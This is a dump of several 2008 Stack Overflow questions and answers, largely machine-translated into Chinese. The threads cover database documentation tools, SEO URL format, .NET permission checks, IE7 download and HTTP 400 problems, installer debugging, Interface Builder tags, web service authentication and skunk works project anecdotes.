[datetime.datetime(2008, 10, 4, 0, 0), datetime.datetime(2008, 10, 11, 0, 0), datetime.datetime(2008, 10, 18, 0, 0), datetime.datetime(2008, 10, 25, 0, 0), datetime.datetime(2008, 11, 1, 0, 0), datetime.datetime(2008, 11, 8, 0, 0), datetime.datetime(2008, 11, 15, 0, 0), datetime.datetime(2008, 11, 22, 0, 0), datetime.datetime(2008, 11, 29, 0, 0), datetime.datetime(2008, 12, 6, 0, 0)]
>>> print list(r2)
[datetime.datetime(2008, 12, 13, 0, 0), datetime.datetime(2008, 12, 20, 0, 0), datetime.datetime(2008, 12, 27, 0, 0), datetime.datetime(2009, 1, 3, 0, 0), datetime.datetime(2009, 1, 10, 0, 0), datetime.datetime(2009, 1, 17, 0, 0), datetime.datetime(2009, 1, 24, 0, 0), datetime.datetime(2009, 1, 31, 0, 0), datetime.datetime(2009, 2, 7, 0, 0), datetime.datetime(2009, 2, 14, 0, 0)] 
```

此代码不访问 rrule 的任何私有属性（尽管您可能需要查看`_byweekday`）。

# sql - 如何记录数据库

> ID：369266
> 
> 赞同：69
> 
> 时间：2008-12-15T18:25:21.813
> 
> 标签：sql, oracle, documentation

（注意：我意识到这与[How do you document your database structure?](https://stackoverflow.com/questions/186392/how-do-you-document-your-database-structure)很接近，但我不认为它是相同的。）

我已经开始在一个拥有数百个表和视图的数据库的地方工作，所有这些表和视图的名称都很神秘，元音很少，也没有文档。他们也不允许对数据库模式进行无偿更改，我也不能触摸任何数据库，除了我自己机器上的测试数据库（它会被吹走并定期重新创建），所以我不能添加对任何人都有帮助的评论。

我尝试使用“Toad”创建一个 ER 图，但在让它连续运行 48 小时后，它仍然没有产生任何可见的东西，我需要我的电脑回来。我正在与其他一些最近的员工交谈，我们都建议，每当我们对特定表或其中某些列的含义感到困惑时，我们应该在开发人员 wiki 中更新它。

那么有什么好的方法来做到这一点呢？只是列出表/视图及其列并在我们进行时填写它们？我手头的基本工具是 Toad、Oracle 的“SQL Developer”、MS Office 和 Visio。

##尝试使用此评论重新打开它

* * *

## 回答 #1

> 赞同：79
> 
> 时间：2008-12-15T19:06:26.100

以我的经验，ER（或 UML）图并不是最有用的工件 - 有大量表格，图（尤其是逆向工程图）通常是一个大的错综复杂的混乱，没有人从中学到任何东西。

为了我的钱，一些好的人类可读的文档（可能补充了系统较小部分的图表）会给你最多的里程。对于每个表，这将包括：

*   表的含义以及如何在功能上使用（在 UI 等中）的描述
*   每个属性含义的描述（如果不明显）
*   从这个表到其他表的关系（外键）的解释，反之亦然
*   附加约束和/或触发器的说明
*   对涉及表格的主要视图和过程的附加说明，如果它们还没有很好的记录的话

综上所述，不要为了记录而记录——重申显而易见的文件只会妨碍人们。相反，专注于一开始让你感到困惑的东西，然后花几分钟写出非常清晰、简洁的解释。这将帮助您考虑清楚，并且将*极大地*帮助第一次遇到这些表格的其他开发人员。

正如其他人所提到的，有各种各样的工具可以帮助您管理此问题，例如[Enterprise Architect](http://www.sparxsystems.com.au/)、[Red Gate SQL Doc](http://www.red-gate.com/products/SQL_Doc/index.htm)以及来自不同供应商的内置工具。但是，虽然工具支持很有帮助（在更大的数据库中甚至是至关重要的），但努力*理解*和*解释*数据库的概念模型才是真正的胜利。从这个角度来看，您甚至可以在文本文件中执行此操作（尽管以 Wiki 形式执行此操作将允许几个人协作以增量方式添加到该文档中 - 因此，每当有人发现某些内容时，他们都可以将其添加到不断增长的正文中文件立即）。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2008-12-15T18:41:50.220

要考虑的一件事是 DBMS 中内置的 COMMENT 工具。如果您对 DBMS 本身中的所有表和所有列添加注释，那么您的文档将位于数据库系统中。

使用 COMMENT 工具不会对模式本身进行任何更改，它只会将数据添加到 USER_TAB_COMMENTS 目录表。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-12-15T18:57:01.390

我们使用[Enterprise Architect](http://www.sparxsystems.com.au/)进行数据库定义。我们包括在 UML 中定义的存储过程、触发器和所有表定义。该程序的三个出色功能是：

1.  从 ODBC 连接导入 UML 图。
2.  一次为整个数据库生成 SQL 脚本 (DDL)
3.  生成数据库的自定义模板文档。

您可以在 UML 工具中编辑您的类/表定义，并生成包含图片的完整描述文档。自动生成的文档可以是多种格式，包括 MSWord。我们的模式中只有不到 100 个表，而且非常易于管理。

在我作为开发人员的 10 多年中，我从未对任何其他工具印象深刻。EA 一举支持 Oracle、MySQL、SQL Server（多个版本）、PostGreSQL、Interbase、DB2 和 Access。每当我遇到问题时，他们的论坛都会及时回答我的问题。强烈推荐！！

当 DB 发生更改时，我们在 EA 中进行然后生成 SQL，并将其签入我们的版本控制 (svn)。我们使用[Hudson](http://hudson-ci.org/)进行构建，当它看到您修改了签入的 sql 时，它会从脚本中自动构建数据库。

（[主要是从我的另一个答案中窃取的](https://stackoverflow.com/questions/304834/stategies-for-coping-with-schema-evolution#308901)）

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2015-03-23T23:01:08.207

在我们的团队中，我们采用了有用的方法来记录遗留的大型 Oracle 和 SQL Server 数据库。我们使用[Dataedo](http://dataedo.com)记录数据库模式元素（数据字典）和创建 ERD 图。Dataedo 带有文档存储库，因此您的所有团队都可以在线记录和阅读最近的文档。而且您不需要干扰数据库（Oracle 注释或 SQL Server MS_Description）。

首先，您导入模式（所有表、视图、存储过程和函数——带有触发器、外键等）。然后，您定义逻辑域/模块并将所有对象（拖放）分组到它们中，以便能够分析和处理较小的数据库块。对于每个模块，您创建一个 ERD 图并编写顶级描述。然后，当您发现表和视图的含义时，为每个表和视图写一个简短的描述。对每一列执行相同的操作。Dataedo 使您能够为每个对象和列添加有意义的标题——如果对象名称模糊或无效，这将非常有用。专业版使您能够描述外键、唯一键/约束和触发器——这对于理解数据库很有用但不是必需的。

您可以通过 UI 访问文档，也可以将其导出为 PDF 或交互式 HTML（后者仅在 Pro 版本中可用）。

这里描述的是一个连续的过程，而不是一次工作。如果您的数据库发生更改（例如，新列、视图），您应该定期同步您的文档（使用 Dataedo 进行几次单击）。

请参阅示例文档： [http ://dataedo.com/download/Dataedo%20repository.pdf](http://dataedo.com/download/Dataedo%20repository.pdf)

关于文档过程的一些指南：

图表：

*   保持图表小而易读——只包括重要的表格、关系和列——只包含对理解大图有任何意义的图表——主键/业务键、重要属性和关系，
*   为图表中的关键表使用不同的颜色，
*   每个模块可以有多个图表，
*   您可以将图表添加到最重要的表/具有大多数关系的描述中。

说明：

*   不要记录明显的 - 不要为 document.date 列写描述“文档日期”。如果没有什么有意义的添加就留空，
*   如果存储在表中的对象具有类型或状态，最好在表的一般描述中列出它们，
*   定义预期的格式，例如。“mm/dd/yy”表示存储在文本字段中的日期，
*   列出所有已知/重要的值及其含义，例如状态列可能是这样的：“文档状态：A - 活动，C - 已取消，D - 已删除”，
*   如果表有任何 API——应该用于读取数据的视图和插入/更新数据的函数/过程——在表的描述中列出它，
*   描述行/列的值来自哪里（过程、表单、界面等），
*   对不应该使用的列使用“[deprecated]”标记（或类似标记）（标题列对此很有用，说明应该在描述字段中使用哪个字段）。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2011-05-04T07:10:00.883

这是一篇关于如何处理数据库文档的好帖子：[http ://www.simple-talk.com/sql/database-administration/database-documentation---lands-of-trolls-why-and-how/](http://www.simple-talk.com/sql/database-administration/database-documentation---lands-of-trolls-why-and-how/)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-12-15T18:58:21.577

wiki 解决方案支持超链接和协作编辑，但 wiki 仅与保持其组织和最新的人一样好。无论您使用什么工具，您都需要有人拥有文档项目的所有权。该人可能会涉及其他知识渊博的人来填写详细信息，但应由一个人负责组织信息。

如果您无法使用工具通过逆向工程生成 ERD，则必须使用 TOAD 或 VISIO 手动设计一个。

任何包含数百个对象的 ERD 都可能无法作为开发人员的指南，因为有这么多的框和行将无法阅读。在具有如此多对象的数据库中，很可能存在由几十个表和视图组成的“子系统”。因此，您应该为这些子系统制作自定义图表，而不是期望有工具为您完成。

您还可以设计一个伪 ERD，其中表组由一个图中的单个对象表示，而该组在另一个图中展开。

单个 ERD 或一组 ERD 不足以记录这种复杂性的系统，正如类图不足以记录 OO 系统一样。您必须使用 ERD 作为插图来编写文档。您需要对每个表、每列以及表之间的关系的含义和用途进行文本描述（尤其是在此类关系是隐式而不是由参照完整性约束表示的情况下）。

所有这些都是大量的工作，但这是值得的。如果有一个清晰且最新的地方记录模式，整个团队都将从中受益。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-12-15T19:04:39.533

这个答案扩展了 Kieveli 的上述内容，我对此表示赞同。如果您的 EA 版本支持对象角色建模（概念设计，与逻辑设计 = ERD），请对其进行逆向工程，然后使用它为您提供的丰富表现力填充模型。

便宜和轻量级的选择是从 MS 免费下载 Visiomodeler，然后做同样的事情。

ORM（称为 ORMDB）是我发现的唯一一个支持和鼓励与非 IS 利益相关者就 BL 对象和关系进行数据库设计对话的工具。

现实检查 - 在生成 DDL 的过程中，它会经过一个完整的 ERD 阶段，您可以在此满足您关于它是否有任何问题的问题。它没有。它可能会向您展示您自己设计的 ERD 的弱点。

ORMDB 是工具越概念化，市场越小这一原则的经典案例。女孩只想玩得开心，程序员只想编码。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-12-15T18:30:51.257

由于您有幸与同一条船上的其他开发人员一起工作，我建议您询问他们认为最容易传达所需信息的方式。我的公司有 100 多个表，我的老板给了我一个 ERD，用于所有连接的特定集合表。因此，您可能还想尝试将 1 个大型 ERD 分解为一组更小的、可管理的 ERD。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2015-06-23T10:08:03.883

如果向最终用户描述您的数据库是您的主要目标[，那么 Ooluk 数据字典管理器](http://www.ooluk.com/)可以证明是有用的。它是一个基于 Web 的多用户软件，允许您将描述附加到表和列，并允许对这些描述进行全文搜索。它还允许您使用标签对表进行逻辑分组，并使用这些标签浏览表。可以标记表和列以在您的数据库中查找相似的数据项。

该软件允许您使用 API 将元数据信息（例如表名、列名、列数据类型、外键）导入其内部存储库。对 JDBC 数据源的支持是内置的，并且可以进一步扩展，因为 API 源在 ASL 2.0 下分发。它被编码为从许多 RDBMS 中读取 COMMENTS/REMARKS。您始终可以手动覆盖导入的信息。可以使用自定义字段扩展您可以存储的有关表和列的信息。

数据字典管理器使用“数据对象”和“属性”术语而不是表和列，因为它不是专门为关系数据库设计的。

笔记

*   如果描述数据库的技术方面（例如触发器、索引、统计信息）很重要，则此软件不是最佳选择。但是，可以使用超链接自定义字段将技术解决方案与该软件相结合。
*   该软件不生成 ERD

披露：我在开发该产品的公司工作。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-12-15T21:31:57.567

好吧，一张图片说明一千个单词，所以我建议创建 ER 图，您可以在其中一目了然地查看表之间的关系，这是纯文本描述很难做到的。

您不必在一个图表中完成整个数据库，将其分解为多个部分。我们在工作中使用 Visual Paradigm，但 EA 和 ERWIN 一样是一个不错的选择，毫无疑问还有很多其他的也一样好。

如果您有耐心，那么使用 html 来记录表格和列会使您的文档更易于访问。

# seo - What's better for SEO? StackOverflow.com style "domain.com/91512/some-trimmed-text" or "domain.com/91512_some-trimmed-text"

> ID：369272
> 
> 赞同：-1
> 
> 时间：2008-12-15T18:27:51.620
> 
> 标签：seo

Love to hear your opinions and justification?

I've heard deep directories are bad, but how does it compare to underscore characters?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T18:30:00.540

Use dashes - Google regards dashes as separating words, but underscores are considered part of the word. See [http://www.codinghorror.com/blog/archives/000574.html](http://www.codinghorror.com/blog/archives/000574.html).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T18:32:05.043

These trick are good for 1 week than it changes. All SEO stuff aren't based on written rule. It's very suggestive and between SEO they do not really agree, so to have the number written as directory or before an underscore doesn't really have a better way. Of course, it's better to have the title the way SO work for indexing but for how to organize folder/files, it doesn't matter (of course some SEO will tell the different and this same guy will change his believe in 1 month...).

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T22:14:02.897

截至去年 8 月，Matt Cutts 仍然在说[破折号比下划线更好，](http://www.mattcutts.com/blog/whitehat-seo-tips-for-bloggers/)但暗示它们最终会被同样对待。

大多数 SEO 认为 Matt 是该领域的领先专家，也是谷歌在 SEO 社区中的主要发言人，尽管是非官方的。

但问题实际上是关于下划线与正斜杠的。我认为没有太大区别，但会提供第三种非常常见的替代方案：domain.com/91512-some-trimmed-text。我们在 Rails 应用程序中经常使用它，因为 Active Record 可以使用表 id，就好像以下字符串不存在一样。

# c# - 如何以编程方式检查 .NET 中的有效删除（修改）或写入权限？

> ID：369273
> 
> 赞同：3
> 
> 时间：2008-12-15T18:28:03.867
> 
> 标签：c#, asp.net, file-permissions

提前抱歉这个长问题。我真正感兴趣的是一种以编程方式检查正在执行的 Windows 身份是否具有足够的 Windows 权限来写入 ASP.NET Web 服务应用程序中的目录（或文件）的方法。但我将满足于为用户检索给定目录或文件的有效删除（修改）权限。问题是我希望能够做到这一点，而无需编写临时文件或不必执行 IO 操作并处理异常。

是的，已经有一个问题了（请参阅[如何以编程方式确定我是否有在 .Net 中使用 C# 的写入权限？](https://stackoverflow.com/questions/137031/how-can-i-programmatically-determine-if-i-have-write-privileges-using-c-in-net)）通常我会同意接受的答案，即最好的方法是尝试 IO 操作并处理任何异常——System.IO 方法确实会抛出 System.UnauthorizedAccessException 以指示由于特权拒绝而导致的失败。但是在上传文件的情况下，我真的很想在浪费上传数据的时间和资源之前检查权限，因为只有在上传之后我们才能尝试写入有问题的文件或文件夹。我很遗憾任何通过 http 上传 2GB 文件的用户在上传完成后才被告知他们无权将文件上传到目的地。

如果您不想执行实际写入，测试写入访问的常用方法是写入一个临时文件。另一个问题有一个答案指出了这一点。这就是我们的代码当前所做的。但是 Windows 安全性允许写入访问权限而没有删除权限。只有写入权限但没有删除权限的用户最终会留下各种未删除的 .tmp 文件。不，我们不想使用域管理员帐户来重置 tmp 文件上的 ACL，然后删除它们。我一直采用的方法是使用 System.IO.Directory.GetAccessControl(..) 或 System.IO.File.GetAccessControl(..) 检查用户是否具有写入权限，并处理各种访问规则和 ACE 返回...但是有了这个我仍然有处理有效权限的问题——即在大多数情况下我还必须查找用户' s ACE 中列出的任何组的成员资格，这些组对对象具有权限。必须有一个更简单的方法......不是吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T18:41:14.013

非常感谢在用户体验方面付出了更多努力并试图保持干净的程序结构。也许如果您只上传，您可以尝试创建一个与最终 2GB 文件同名的空“占位符”文件，然后覆盖它。不完美，因为你仍然可以得到一个空文件，但很容易，至少比一些替代品更优雅一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T20:42:38.417

您还可以拥有永久文件，例如“access_test.txt”，您尝试用日期戳或其他内容覆盖该文件以首先测试当前访问。

# asp.net - IE7 重定向到大型 excel 文件时出现问题

> ID：369277
> 
> 赞同：2
> 
> 时间：2008-12-15T18:29:19.153
> 
> 标签：asp.net, internet-explorer, download

我们在我们的 asp.net 网络系统中有一个页面，它使用 response.redirect 将用户直接重定向到一个 excel 文件，因此它将“自动”下载，而无需用户右键单击/另存为。

这很好用——除了 IE7 中超过 100k 的文件。其他浏览器只是下载大文件正常，IE 在该阈值下工作正常，但在大约 200k 的某个地方，IE 刚刚开始发出“页面无法显示”错误。

显然，我们希望用户也能够在 IE 中下载 - 有什么想法吗？我可以覆盖某种下载大小阈值吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T18:46:55.170

您可以围绕此文件制作一个简单的 ashx 包装器，并使用 http 标头强制 IE 下载此文件：“Content-disposition: attachment; filename=fname.xls”

[如何为已知 MIME 类型打开“文件下载”对话框](http://support.microsoft.com/kb/260519)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T18:45:33.973

我更喜欢另一种发送文件的方法。它适用于各种不同类型和大小的文件。

不要使用 Response.Redirect，而是允许文件的链接在您修改响应的地方进行回发，如下所示：

```
Public Shared Sub SendFileToBrowser(ByRef response As HttpResponse, ByVal filepath As String, Optional ByVal filename As String = "", Optional ByVal contentType As String = "", Optional ByVal disposition As String = "", Optional ByVal contentLength As String = "")
    Dim ext As String = filepath.Substring(filepath.Length - 3, 3)

    If String.IsNullOrEmpty(contentType) Then
        If ext = "pdf" Then
            contentType = "application/pdf"
        Else
            contentType = "application/file"
        End If
    End If

    If String.IsNullOrEmpty(disposition) Then
        disposition = "attachment"
    End If

    If String.IsNullOrEmpty(filename) Then
        ''//Test for relative url path
        Dim fileparts As String() = filepath.Split("/")
        If fileparts.Length > 1 Then
            filename = fileparts(fileparts.Length - 1)
        Else
            ''//Test for absolute file path
            Dim fileparts2 As String() = filepath.Split("\")     ''//" SO: Fix syntax highlighting
            If fileparts2.Length > 1 Then
                filename = fileparts2(fileparts2.Length - 1)
            Else
                ''//Just give it a temp name
                filename = "temp." & ext
            End If
        End If
    End If

    response.Clear()

    response.AddHeader("content-disposition", disposition & ";filename=" & filename)
    If Not String.IsNullOrEmpty(contentLength) Then
        response.AddHeader("Content-Length", contentLength)
    End If

    response.ContentType = contentType

    response.Cache.SetCacheability(HttpCacheability.Public)        

    response.TransmitFile(filepath)
    response.End()
End Sub 
```

注意：使用“''//”作为注释，以便语法高亮显示正常工作。这仍然可以正确编译。

这适用于我们在 IE6 和 IE7 中。

# windows - Is there a way to debug installer executable created using installshield universal?

> ID：369281
> 
> 赞同：0
> 
> 时间：2008-12-15T18:30:45.577
> 
> 标签：windows, installshield

I have created a windows executable with some custom actions and some UI stuffs.

I am facing a strange behavior with the installable.

I tried probing through the code and kracking the installer as much as I can, but I did not find any idea why the strange behavior is available.

So, I wanted to debug the installer at every point of code execution in the Custom Action for which I tried writing those values I require to a logger. But unfortunately my logger will get created after the installation at which point I will not be in a position to run it again.

So, can anyone suggest how to debug it while the installable is under execution?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-11-02T04:32:35.887

我已经尝试过，但无法让调试器与 Installshield Universal 一起工作。

我的解决方法是添加大量调试消息并使用 VMware。安装 VMware 并将测试机器创建为虚拟服务器。我为虚拟服务器配置了所有先决条件，重新启动它，然后运行快照。

快照后，我将运行安装脚本，等待错误和日志文件。然后，我将使用 VMware 的“恢复到快照”功能返回到测试服务器的干净实例并开始调查日志中的错误消息。

# iphone - 使用 Interface Builder 标签

> ID：369288
> 
> 赞同：3
> 
> 时间：2008-12-15T18:33:58.910
> 
> 标签：iphone, cocoa, cocoa-touch

我正在使用界面构建器的标签功能来访问我在 xib 文件中实例化的一些 UILabel。由于这是一个 UITextViewCell 我想避免多余的方法调用，但我也想正确地做到这一点。因此，当我这样做时：

```
UILabel *label = (UILabel *)[cell viewWithTag:1]; 
```

我想知道我是否应该像这样包装它：

```
if([[cell viewWithTag:1] isKindOfClass [UITableViewCell class]]) {
    UILabel *label = (UILabel *)[cell viewWithTag:1];
} 
```

对此的任何讨论将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-15T22:56:44.107

像 August 一样，我建议您在视图层次结构的该分支中使您的标签编号唯一。

我还建议您设置一个`enum`枚举可能的标记值，以便您的`viewWithTag:`方法变得更具可读性。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-15T18:46:50.553

除非您有许多不同类的不同对象，它们的子视图标记为“1”，否则这是没有必要的。

如果您确实有一堆不同的对象（例如单元格），它们具有不同的类，但都有带有 1 标记的子视图，我会重新考虑您的标记方案。也许是 101、201 和 301 等。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-16T01:08:17.757

是的，我发现 enum 方法效果很好，或者只是在做 #define foo 1、#define bar 2 等。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-04-13T09:50:59.983

您在属性编辑器中使用 command-1 在界面生成器中设置标签，并在背景设置下查找“标签”。

# internet-explorer - IE7 HTTP 错误 400

> ID：369289
> 
> 赞同：2
> 
> 时间：2008-12-15T18:34:00.080
> 
> 标签：internet-explorer, http, firefox, internet-explorer-7

为什么 IE 7 会在 Firefox 加载的同一页面上显示 HTTP 错误“错误请求”400 而不会抱怨？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-15T19:55:45.813

当您收到这样的消息时，请关闭 IE 中的友好 HTTP 错误消息。为此，请转到工具 -> Internet 选项 -> 高级。取消选中显示友好的 HTTP 错误消息。完成此操作后，您应该会收到更详细的消息，它将指出真正的问题。

您是否有可以共享的 URL 以进一步诊断问题？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-15T20:23:37.330

安装[Fiddler](http://www.fiddler2.com/Fiddler2/version.asp)并准确查看***IE***从服务器发送/接收的内容。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T18:38:31.210

服务器可能拒绝了 IE 发出的请求。可能是服务器问题，也可能是 IE 问题。但是，我怀疑在没有更具体地解决问题的情况下是否可以提供任何帮助。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-15T18:44:32.070

有很多事情可以尝试解决正在发生的事情：

1）查看服务器日志。由于 400 错误通常是由来自客户端的错误或无效数据引起的，因此服务器可能会将错误记录到其日志中。

[2）通过Charles](http://www.charlesproxy.com/)等代理运行Firefox和IE7，看看这两个浏览器的请求有什么不同

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-15T20:04:52.407

如果您安装了 firebug（在 firefox 中），请查看 Net 选项卡并查看 400 标头是否没有被传回。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-15T19:36:28.567

也许您遇到了[涉及 javascript的](http://weblogs.asp.net/infinitiesloop/archive/2006/11/02/Dealing-with-IE-_2600_quot_3B00_Operation-Aborted_2600_quot_3B002E00_-Or_2C00_-how-to-Crash-IE.aspx "involving javascript")[IE7 错误](http://blogs.msdn.com/ie/archive/2008/04/23/what-happened-to-operation-aborted.aspx "IE7 错误") ？

它不完全符合您的描述，但它是特定于 IE 的，而且很难追踪。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-26T02:53:31.763

此外，IE 替换/用于替换URL 中的**`\`**正斜杠 (" **`/`**") 的反斜杠 (" ") - 服务器脚本是否可能使用 URL 中的反斜杠作为特殊字符？

# asp.net - 如何有效地对调用 Web 服务的用户进行身份验证？

> ID：369291
> 
> 赞同：1
> 
> 时间：2008-12-15T18:34:59.220
> 
> 标签：asp.net, web-services, security

在多服务器环境中，用户将能够使用页面来放置、更新或删除服务器上的文件。我正在考虑使用 IIS 线程调用的 web 服务（在每台服务器上）来完成这项工作（使用 aspx 管理页面）。

但是，出于显而易见的原因，我真的不希望任何人能够调用该 Web 服务（通过从他们的机器上发布格式良好的请求）。

我想知道什么是最有效的（就复杂性、可扩展性而言）方法来确保对 Web 服务的访问仅限于我的页面（令牌？发送当前用户的委托人？我无权访问他们的密码所以发送登录名/密码对是不可能的）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T19:39:50.133

您可以将 SHA1 哈希与由浏览器（例如 MSIE6.0 或 FireFox3）、IP 地址、用户名（如果可能）和/或时间组合生成的每个传入请求的 IP 地址相关联，并将其存储在数据库中（ sqlite 可能）具有适合让文件上传/传输完成的到期时间（比如 1 小时）。因此，对于每个请求，您都可以检查与 IP 地址相关的哈希。

如果页面是指通过浏览器，那么我建议使用 cookie 来传输哈希。

注意：我说 SHA1 哈希是因为它有 160 位长（40 字节）。因此，冲突并不容易发生，特别是如果您将时间与用户独有的东西结合起来生成摘要。

我在 C++ 上工作，所以我在 CGI 应用程序中实现了类似的功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T19:45:33.977

您应该能够通过获取存储在以下位置的 IPrinciple 对象来获取调用 Web 服务的用户：

```
IPrinciple _currentUser = HttpContext.Current.User; 
```

获得当前用户后，您应该能够通过检查用户是否具有正确的角色或任何其他方式来验证该用户是否有权执行他们尝试执行的任何操作您已设置检查权限。

# project-management - Skunk Works Projects

> ID：369297
> 
> 赞同：12
> 
> 时间：2008-12-15T18:36:35.923
> 
> 标签：project-management, skunk-works

***Skunk Works Project***: A project carried out by one part of a company without the knowledge of the remainder of the company.

Looking for stories about any skunk works projects you've worked on or initiated:

*   Was it successful?
*   Were you found out?
*   Were you punished or rewarded?
*   How did you fund it?
*   How did you staff it?
*   How long did it take to finish, compared to above-ground projects?
*   What was the cost, compared to above-ground projects?
*   Was it formally adopted?

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-15T18:51:36.487

很好的问题。非常重要的问题。

Geoffrey Moore (Inside the Tornado, Crossing the Chasm 等) 写道，当他在世界各地演讲时，他有一个问题会问每个客户（包括通用电气、摩托罗拉等）。

问题是：

**“你能给我举一个例子，说明贵公司的研究或产品开发过程中真正具有开创性、范式转变的创新吗？”**

至少在我读到这句话的时候，**还没有发现一个例子**。在大多数情况下，此类产品或服务是由一小部分人构思、设计和开发的，他们充其量是被**忽视**的，但经常遭到研发部门的**积极反对。**

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-15T19:09:59.150

不确定这是否符合“臭鼬作品”项目的条件，但这里有一个来自[This American Life](http://thisamericanlife.org)的精彩故事。[这是2005 年 3 月这一集](http://www.thisamericanlife.org/Radio_Episode.aspx?episode=284)的第二幕。

> Amy O'Leary 讲述了 Apple Computer 的一位软件作家的故事，他的工作合同到期，但他拒绝离开。他每天继续出现在工作中，偷偷溜进前门，躲在空荡荡的办公室里，并在公司取消的项目上投入大量时间。没有会议，没有办公室政治，没有经理干涉他的工作。很快，他就写出了一个完美的软件。他的最后一个问题是弄清楚如何在没有任何人注意的情况下将其秘密安装到 Apple 的新电脑中。（12 分钟）

非常适合任何人，尤其是在这种情况下的程序员。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-15T18:42:54.477

I have actually done a number of these "Secret" project type situations. Were they are not fully supported when started, and kept very secret. I'll discuss on of these along the lines of your questions.

Was it successful?

Yes, the system developed was put into place 3 years ago, and has been functioning ever since.

Were you found out?

Yes, it was discovered, and it was part of the overall plan.

Were you punished or rewarded?

With a working prototype we were rewarded, given the extra resources needed, and eventually the system was put into place for the entire company to use.

How did you fund it?

It was a development activity that was simply completed in down-time and personal time by various people.

How did you staff it?

See the above.

How long did it take to finish, compared to above-ground projects?

We did the entire thing in about 4 months, with dedicated resources a single person could have done it in about 2 months, or a team in about 3-4 weeks.

What was the cost compared to above-ground projects?

No cost, using down-time that was already "wasted" to be put to effective use. All existing infrastructure for the final incarnation was already there.

Was it formally adopted?

Yes, it is a solid part of the business plan now, and has been for over 3 years.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-15T19:00:43.787

我们目前处于这种情况，尽管不可否认，该项目不会有很高的知名度 - 尽管每个人最终都会使用它。

作为重建我们大多数企业应用程序的准备工作的一部分，我们已经开始开发一个应用程序框架，它将成为所有替代应用程序的基础。我们已经有了每个人都知道我们用来评估概念的“基准项目”和“概念验证”时间。不过，这一次的不同之处在于我们正在积极开发一个完整的项目。

*   **成功了吗？**- 我们还没有推出完整的框架，但由于它是模块化的，因此已经在遗留应用程序中推出了部分。其中大部分都集中在稳定性和报告/日志记录问题上。到目前为止，它们超出了预期，使我们能够更快地对问题做出反应，并消除了一些以前反复出现的问题。

*   **你被发现了吗？**- 嗯，这个项目已经成为我见过的最保守的秘密之一。虽然有不少人听说过这个项目的名称，但我认为除了我的一些开发人员和测试团队之外，没有人真正知道它是什么。

*   **你受到惩罚或奖励了吗？**- 我们还没有考虑过这方面的任何一方。除非该框架会造成负面影响，否则我怀疑我们会因此受到惩罚。然而，即使它是成功的，奖励将是除了改进的应用程序之外没有人注意到任何东西。

*   **你是如何资助它的？**- 如前所述，其他项目之间的工作时间和包含在“概念验证”工作中。我还在通勤途中投入了一些个人时间，因为它将为我的所有开发人员将来如何与应用程序交互奠定基础。

*   **你是怎么安排的？**- 我从遗留代码库中的一系列小型概念证明开始，作为“维护”应用程序的一部分。进入并修复缺陷通常涉及分析步骤，即可以采取哪些措施来防止事情发生或改善未来的体验。这些最终在他们自己的程序集中被提取和重构，这成为了框架的开始。我们现在将“隐蔽”项目放入我们的迭代中，以帮助我的开发人员充实这些想法，我们现在正在根据实施的成功提取和重构他们的努力。

*   **与地上项目相比，完成需要多长时间？**- 尚未确定。由于这不是一个官方项目，所以到目前为止它真的没有任何成本。板凳时间和“概念验证”工作是标准包含。事实上，我们实际上是在从这个时候开始创造一些东西，而不是把它扔掉，这是肉汁。

*   **与地上项目相比，成本是多少？**- 再次，尚未确定。我想与大型项目相比，前期成本会相对较小。考虑到这是一个包含常用扩展并提高开发人员高效工作能力和质量的框架，由于节省时间、改进实践和减少缺陷，它可能会在完成之前就收回成本。

*   **被正式采纳了吗？**- 开发人员已经接受了这个概念。我的直接管理人员正在咬牙切齿。我的管理同行很兴奋，如果不是对它会做什么有点困惑。衡量标准将是基于框架构建的应用程序的成功——这还有一段距离。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-15T19:13:13.153

我构建了一个工具来验证工作中目标数据库的模式更改。在使用我的工具之前，我们使用客户端站点上的 DBA 必须运行的丑陋脚本手动完成所有操作。我的工具开始跟踪数据库的结构，以了解某些事情是否会奏效。我对不得不手动检查所有这些东西感到沮丧，或者遭受手工操作时不可避免的错误，所以我建立了我的验证器，这是它的故事......

**成功了吗？**

是的

**你被发现了吗？**

是的。臭鼬工程项目的部分方面是它最终必须浮出水面。

**你受到惩罚或奖励了吗？**

最初受到惩罚 - 为什么不从事主流活动。但是一旦好处变得明显并且产品错误减少了，就会得到回报。然后它被预告了——每个人都喜欢赢家。

**你是如何资助它的？**

